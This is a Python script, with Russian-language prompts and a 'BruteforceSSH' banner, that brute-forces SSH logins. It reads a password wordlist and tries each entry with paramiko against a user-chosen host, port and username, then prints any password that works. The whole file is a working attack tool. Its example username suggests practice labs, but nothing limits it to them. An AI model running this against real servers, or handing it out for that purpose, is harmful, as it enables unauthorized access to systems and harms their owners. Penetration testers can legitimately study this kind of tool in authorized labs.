import paramiko
import time

from pyfiglet import *
from pystyle import *

import os


Success = Colors.green + "[+]" + Colors.reset
Error = Colors.red + "[-]" + Colors.reset


def taking_passwords(filename):
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = []
            for line in f:
                cleaned_line = line.strip()
                if cleaned_line:
                    passwords.append(cleaned_line)
            return passwords
        
    except FileNotFoundError:
        return f"{Error} Ошибка: файл '{filename}' не найден"
    
    except UnicodeDecodeError:
        return f"{Error} Ошибка: проблемы с кодировкой файла '{filename}'"
    
    except Exception as e:
        return f"{Error} Неизвестная ошибка при чтении файла: {str(e)}"


def ssh_bruteforce(host, port, username, password_file, delay):
    passwords = taking_passwords(password_file)
    if not passwords:
        return
    
    found = False
    attempts = 1
    start_time = time.time()

    for password in passwords:
        attempt_number = Colors.blue + f"№{attempts}" + Colors.reset
        print(f"\nПопытка {attempt_number}. Проверка пароля: {password}")
        attempts += 1

        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(host, port=port, username=username, password=password, timeout=5)

            print(f"\n{Success} Успех! Пароль найден: {password}")
            print(f"{Success} Время выполнения: {time.time() - start_time:.2f} секунд \n")
            
            found = True

            time.sleep(2)
            quit()

        except paramiko.AuthenticationException:
            time.sleep(delay)

        except Exception as e:
            print(f"\n{Error} Неожиданная ошибка: {e}")
            break

    if found == False:
        print(f"\n{Error} Пароль не найден в списке \n")
        time.sleep(2)
        quit()


def display_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    t = Figlet(font='slant')
    Print = t.renderText('BruteforceSSH')
    DenisPythoneer = (' ' * 125) + "https://github.com/DenisPythoneer"
    Write.Print(Center.XCenter(Print), Colors.blue_to_cyan, interval=0.001)
    Write.Print(Center.XCenter(DenisPythoneer), Colors.blue_to_cyan, interval=0.001)


def main():
    display_banner()

    host = input("\n[!] Введите IP-адресс: ")
    port = int(input("[!] Введите порт (По умлочанию '22'): "))
    username = input("[!] Введите имя пользователя для входа (Например 'msfadmin'): ")
    password_file = input("[!] Введите путь к файлу с паролями для брутфорса (По умолчанию 'Wordlist/passwords.txt'): ")
    delay = int(input("[!] Введите время паузы в секундах между попытками брутфорса (Лучше ставить 3 секунды): "))

    print(ssh_bruteforce(host, port, username, password_file, delay))


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nДо свидания!")